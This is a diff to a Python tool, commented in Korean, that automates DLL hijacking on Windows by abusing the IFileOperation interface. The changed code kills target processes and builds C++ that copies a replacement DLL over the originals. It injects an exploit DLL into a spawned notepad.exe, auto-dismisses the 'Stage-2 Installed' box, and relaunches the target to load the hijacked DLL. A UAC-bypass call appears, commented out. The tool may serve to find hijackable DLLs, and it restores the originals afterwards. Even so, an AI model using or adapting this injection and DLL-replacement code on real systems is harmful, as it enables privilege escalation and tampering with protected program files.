@@ -398,14 +398,14 @@ class hiJacking():
             for i in self.exe_in:
                 self.pid.append(self.create_process(i))
         for i in range(0,len(self.pid)):
-            print(f'{len(self.pid)}개의 pid 중 {i+1}번째 pid로의 Normal hiJacking!')
+            print(f'{len(self.pid)}개의 pid 중 {i+1}번째 pid로의 Abusing IFileOperation!')
         # # DLL 리스트 파싱 후 원활한 파일 이동을 위해 프로세스 종료
             exe_pid = int(self.pid[i])
-            
             program_name, list_dlls = self.list_dll(exe_pid)
             
             psutil.Process(exe_pid).kill()
             dll_abspath = dll_abspath.replace("\\","\\\\")
+            
             # 원본을 전부 dll_tmp 로 복사하기
             for j in list_dlls:
                 if j.endswith("CreateDLL.dll"):
@@ -415,7 +415,7 @@ class hiJacking():
                     dll_name = j.split("/")[-1]
                     
                 # #2. IFileOperation 코드에 원하는 인자를 세팅 후 빌드 하기
-                    
+                    dll_abspath = dll_abspath.replace("/","\\\\")
                     original_dll_path = original_dll_path.replace("/","\\\\")
                     dll_code = "int haxproc(){HRESULT test = CopyItem(L\"%s\", L\"%s\", L\"%s\");if (SUCCEEDED(test)){MessageBoxA(0, \"Stage-2 Installed\", 0, 0);}return 0;}"%(dll_abspath,original_dll_path,dll_name)
                     
@@ -436,15 +436,19 @@ class hiJacking():
                     exploit_dll_path = abspath + "/"+"CreateIFileOperationDLL/Debug/exploitDll.dll"
                 
                     
-                    uac = uac_bypass()
+                    #uac = uac_bypass()
                     #notePad_pid = uac.execute()
                     notePad_pid = self.create_process("C:/Windows/System32/notepad.exe")
                 
                     
                     try:
-
                         inject(notePad_pid,exploit_dll_path)
-                        print("Attack Injection Success!")
+                        
+                        time.sleep(1)
+                        app = Application(backend="win32").connect(process=notePad_pid)
+                        dlg = app.window(title_re="오류")
+                        dlg.확인.click()
+                        psutil.Process(notePad_pid).kill()
                     except Exception as e:
                         
                         print("\nERROR::Attack Injection Fail")
@@ -452,26 +456,13 @@ class hiJacking():
                         if ans == 'y':
                             self.__init__()
                         else: 
-                            print("End the program")
-                    time.sleep(1)
-                    app = Application(backend="win32").connect(process=notePad_pid)
-                    try:
-                        dlg = app.window(title_re="오류")
-                        dlg.확인.click()
-                        pass
-                    except:
-                        
-                        print("\nERROR::Attack Injection Fail")
-                        ans = input('Do you want to try again? Back to the beginning DLL HiJacking\nYes = \'y\', No =\'q\'\ninput: ')
-                        if ans == 'y':
-                            self.__init__()
-                        else: 
                             print("\n\n--End the program--\n")
+            
                     else:
                         # 6. 불필요한 프로세스 종료 후 하이제킹한 DLL 이 로드 될 수 있도록 실행
                         
-                        psutil.Process(notePad_pid).kill()
                         
+                        print("Attack Injection Success!")
                         #다음을 위해 파일 정리하기   
                         os.remove(abspath + "/"+"CreateIFileOperationDLL\CMakeCache.txt")
                         shutil.rmtree(abspath + "/"+"CreateIFileOperationDLL\CMakeFiles")
@@ -483,6 +474,8 @@ class hiJacking():
                         hijacked_pid = self.create_process(program_name)
                         original_dll_path = original_dll_path.replace("\\\\","/").replace("\\","/")   
                         dll_tmp_path = abspath + "/" + "dll_tmp"+"/"+dll_name
+                        
+                        
                         # 7. 기본 악성 DLL을 사용시 messageBoxA가 띄워지므로 pywinauto를 이용하여 확인 버튼 클릭 정상 동작시 성공으로 간주
                         # 4. 원본 dll을 복사 hijacking 종료 후 다시 원상 복귀
                         os.system("cls")
@@ -505,6 +498,8 @@ class hiJacking():
                         original_dll_path = original_dll_path.replace("/","\\\\")
                         dll_tmp_path = dll_tmp_path.replace("\\","/").replace("/","\\\\")
                         dll_code = "int haxproc(){HRESULT test = CopyItem(L\"%s\", L\"%s\", L\"%s\");if (SUCCEEDED(test)){MessageBoxA(0, \"Stage-2 Installed\", 0, 0);}return 0;}"%(dll_tmp_path,original_dll_path,dll_name)
+                        
+                        
                         with open("CreateIFileOperationDLL/reference.cpp",'r',encoding='utf-8') as refFile:
                             refText = refFile.readlines()
                             refFile.close()
@@ -533,7 +528,7 @@ class hiJacking():
                         except:
 
                             print("\nERROR::Restore Injection Fail")
-                            print("\nFile Name : " + original_dll_path)
+                            print("\nFile Name : " + original_dll_path + "/" + dll_name)
                             print("\nYou must restore original dll file yourself!!")
                             
                         time.sleep(1)
@@ -542,9 +537,11 @@ class hiJacking():
                         shutil.rmtree(abspath + "/"+"CreateIFileOperationDLL\CMakeFiles")
                         shutil.rmtree(abspath + "/"+"CreateIFileOperationDLL\Debug")
                         os.remove(abspath + "/"+"CreateIFileOperationDLL\dll.cpp")
+                        dll_tmp_path = dll_tmp_path.replace("\\\\","/")
+                        os.remove(dll_tmp_path)
                     print("\nAbusing IFileOperation을 통해 공격에 성공한 DLL 목록")
                     print(f'\n프로그램 이름 : {program_name}')
                     for j in successed_list:
                         print(f'\n{j}')
                         
-                        
+        print("\n\n--End the program--\n")    
